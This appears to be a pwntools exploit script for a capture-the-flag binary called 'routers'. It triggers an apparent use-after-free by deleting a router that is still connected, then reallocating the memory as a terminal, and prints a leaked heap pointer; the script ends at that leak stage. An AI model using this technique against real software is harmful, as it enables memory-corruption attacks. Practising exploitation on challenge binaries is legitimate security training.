from pwn import *

s = process("./routers")

def show():
	s.sendline("show")
	s.recvuntil("network:")
	out = s.recvuntil("Welcome to new technology router network system!\n")[:-49]
	s.recvuntil(">")
	return out

def createRouter(typ, name):
	s.sendline("create router")
	s.sendline(typ)
	s.sendline(name)
	s.recvuntil(">")

def createTerminal(typ, name, router):
	s.sendline("create terminal")
	s.sendline(router)
	s.sendline(typ)
	s.sendline(name)
	s.recvuntil(">")

def deleteRouter(name):
	s.sendline("delete router")
	s.sendline(name)
	s.recvuntil(">")

def connect(route1, route2):
	s.sendline("connect")
	s.sendline(route1)
	s.sendline(route2)
	s.recvuntil(">")

def disconnect(router):
	s.sendline("disconnect")
	s.sendline(router)
	s.recvuntil(">")


s.recvuntil(">")
rotu1 = randoms(10)
rotu2 = randoms(10)
rotu3 = randoms(10)
createRouter("tplink",rotu1)
createRouter("tplink",rotu2)
createRouter("tplink",rotu3)

connect(rotu1, rotu2)
connect(rotu2, rotu3)
deleteRouter(rotu2)
createTerminal("windows",randoms(10), rotu1)

s.sendline("show")
s.recvuntil(rotu1)
s.recvuntil("connected to ")
ptr = u64(s.recvline()[:-1].ljust(8,"\x00"))

print hex(ptr)
